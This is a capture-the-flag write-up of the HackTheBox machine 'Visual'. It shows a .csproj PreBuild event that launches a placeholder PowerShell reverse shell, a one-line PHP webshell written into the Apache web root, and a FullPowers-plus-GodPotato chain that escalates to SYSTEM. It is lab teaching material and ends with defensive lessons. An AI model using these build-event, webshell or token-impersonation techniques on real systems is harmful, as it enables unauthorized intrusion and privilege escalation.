---
title: "Visual"
date: 2024-02-24
type: docs
tags:
  - htb
  - windows
  - medium
  - dotnet
  - msbuild
  - prebuild-event
  - git
  - rce
  - xampp
  - webshell
  - service-account
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows Server 2022, **Difficulty:** Medium, **Released:** 2024-02-24, **IP:** `10.10.11.234` , `visual.htb`

</div>

<div class="callout callout-warning">

**Partial**

Nothing usable survived in my notes for this box. The whole walkthrough below is reconstructed from published writeups (0xdf, Ev3rPalestine) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `visual.htb` is a service that takes a **Git repository URL**, clones it, builds the .NET 6 project it finds, and returns the compiled binary.
2. Host a repo (a local Git server the box can reach) containing a `.csproj` with a **PreBuild event** (`<Target ... BeforeTargets="PreBuildEvent"><Exec Command="..."/>`). When the box builds it, your command runs. Shell as **`enox`**.
3. `enox` can **write to `C:\xampp\htdocs`**. Apache (XAMPP) runs as **`NT AUTHORITY\LOCAL SERVICE`**, so a PHP webshell there gets you off `enox` but only as far as Local Service, whose token has most privileges stripped.
4. **FullPowers** recovers the token privileges Local Service should have (including `SeImpersonatePrivilege`), then **GodPotato** abuses that privilege against the local RPC/DCOM service to coerce and impersonate a SYSTEM token. SYSTEM.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| (no credentials, both steps are code execution) | |
| `user.txt` | `C:\Users\enox\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

Visual is a **build server** box, and the moment I understood what the site actually does, "clone this repo and compile it for you", I knew the foothold would not involve a single line of traditional exploit code. The service compiles arbitrary .NET projects you point it at, and MSBuild's project files are Turing complete: they can run commands during the build (`PreBuildEvent`, custom `Target`s, inline `Task`s). So "submit a repo to be built" is really "submit code to be run", no memory corruption or injection needed, just an understanding of what a build tool is allowed to do on your behalf. The privesc is less obvious: writing into the Apache document root only buys a shell as the stripped-down `LOCAL SERVICE` account, and getting from there to SYSTEM means recovering the privileges that account is supposed to have and then abusing one of them against the box's own RPC service. It is a good box for the lesson that build systems and CI runners are RCE by design and must be isolated, and that a "SYSTEM-owned" web root does not automatically mean the worker process itself runs as SYSTEM.

Related "submit code / config to a builder" boxes: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/) (Shadow YAML), [Inject](/writeups/hackthebox/linux/easy/inject/) (Ansible). Related webshell into a privileged service's web root, then Potato to SYSTEM: [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference. Related MSBuild abuse: also a common AV bypass technique.

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4   (XAMPP)
```

A single port on a Windows box always makes me slow down and read the page carefully, since the interesting functionality has to be right there in the HTTP surface. The site accepts a URL to a Git repository. It clones the repo, looks for a `.sln` / `.csproj`, builds it with `dotnet build`, and gives you back the `.exe`. It rejects GitHub/GitLab URLs, so you have to serve the repo yourself, which told me straight away that the box wanted me to stand up my own infrastructure rather than just pointing it at a public repo.

### Foothold, malicious MSBuild project

<div class="callout callout-note">

**Serve a Git repo the box can clone**

Run a dumb HTTP Git server on your box (`git daemon`, or `python3 -m http.server` over a bare repo with `git update-server-info`), commit a minimal .NET 6 console project, and submit `http://10.10.14.5:8000/repo.git`. The box clones and builds it.

</div>

<div class="callout callout-note">

**PreBuild event RCE**

MSBuild runs targets during a build. A `.csproj` like this executes `Command` before compilation:
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell -e &lt;base64 reverse shell&gt;" />
  </Target>
</Project>
```
The box builds it as `enox` and your PowerShell fires. (You can also use a `<PreBuildEvent>` property, or `<UsingTask>` with inline C#.)

</div>

Catch the shell as **`enox`**. `user.txt` is on the desktop.

### Privilege Escalation, from a stripped web-server token to SYSTEM

The first thing I check on any host running a web server as a service is who owns that service and what its write permissions look like, because a writable web root under a privileged service is one of the fastest privesc paths on Windows.

```powershell
icacls C:\xampp\htdocs
# ... enox:(OI)(CI)(W)          <-- enox can write here
```

`enox` can write straight into the Apache document root, so I dropped a one-line PHP webshell and requested it.

```powershell
echo '<?php system($_REQUEST["c"]); ?>' > C:\xampp\htdocs\s.php
```

```bash
curl "http://visual.htb/s.php?c=whoami"
# nt authority\local service
```

<div class="callout callout-note">

**Local Service is not SYSTEM, but it is close**

XAMPP's Apache service on this box runs as `NT AUTHORITY\LOCAL SERVICE`, not `LocalSystem`, so the webshell alone does not hand over the box. What Local Service *does* have is a token that, once its usual privilege stripping is undone, can impersonate other accounts on the same host. **FullPowers** restores the privileges a service account like Local Service normally loses (it does this by re-launching itself through the task scheduler, which hands back a fuller token), including `SeImpersonatePrivilege`. From there, **GodPotato** does what every Potato-family tool does: it coerces a SYSTEM-owned RPC/DCOM component into authenticating to a listener you control, captures that authentication, and uses the resulting SYSTEM token to spawn your process.

</div>

```powershell
curl "http://visual.htb/s.php?c=whoami+/priv"
# SeImpersonatePrivilege   Disabled   <-- present but disabled, classic service-account token
```

I uploaded `FullPowers.exe` and `GodPotato.exe` (both are just binaries dropped alongside the webshell, `curl -F` against a small upload endpoint or a second webshell parameter works fine) and chained them together:

```bash
curl "http://visual.htb/s.php?c=C:\xampp\htdocs\FullPowers.exe -c \"C:\xampp\htdocs\GodPotato.exe -cmd 'powershell -e <b64 reverse shell>'\""
```

FullPowers re-execs itself with a repaired token and hands off to GodPotato, which triggers the SYSTEM coercion and runs the supplied command with the impersonated token. The reverse shell that comes back is SYSTEM.

```console
PS C:\> whoami
nt authority\system
```

`cat root.txt` (or `type C:\Users\Administrator\Desktop\root.txt`) returns the 32-character flag for this instance.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Users\enox\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Build systems are code execution.** MSBuild, Gradle, Maven, npm `postinstall`, Makefiles all run arbitrary commands. Build untrusted code in a throwaway, network-isolated, unprivileged sandbox.
- **Service accounts still need privilege hardening.** Apache here runs as `LOCAL SERVICE` rather than `LocalSystem`, which limits but does not eliminate the blast radius: `SeImpersonatePrivilege` sitting disabled-but-present on a service token is exactly what tools like FullPowers and GodPotato are built to abuse.
- **The web root should not be writable by interactive users.** `enox` writing to `htdocs` is the whole first half of the privesc.
- **Patch or mitigate the Potato family.** Restricting NTLM on the loopback adapter, or running services under a virtual service account with `SeImpersonatePrivilege` explicitly removed, closes off this entire class of local-to-SYSTEM escalation.
- **Reject or fully sandbox arbitrary Git URLs.** Allowlisting GitHub is not enough if you clone and build.

---

## Related Writeups

- **Submit config / code to a builder or runner:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [Inject](/writeups/hackthebox/linux/easy/inject/)
- **Webshell into a privileged service's web root, then Potato to SYSTEM:** [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference
- **.NET / MSBuild abuse:** [POV](/writeups/hackthebox/windows/medium/pov/) (ViewState), [Anubis](/writeups/hackthebox/windows/insane/anubis/)

## References

- HTB Visual (0xdf) <https://0xdf.gitlab.io/2024/02/24/htb-visual.html>
- MSBuild targets and tasks <https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets>
- Visual PoC project (Ev3rPalestine) <https://github.com/Ev3rPalestine/Visual-HTB-Walkthrough>
- Final privilege escalation steps cross-referenced against public writeups for this box.
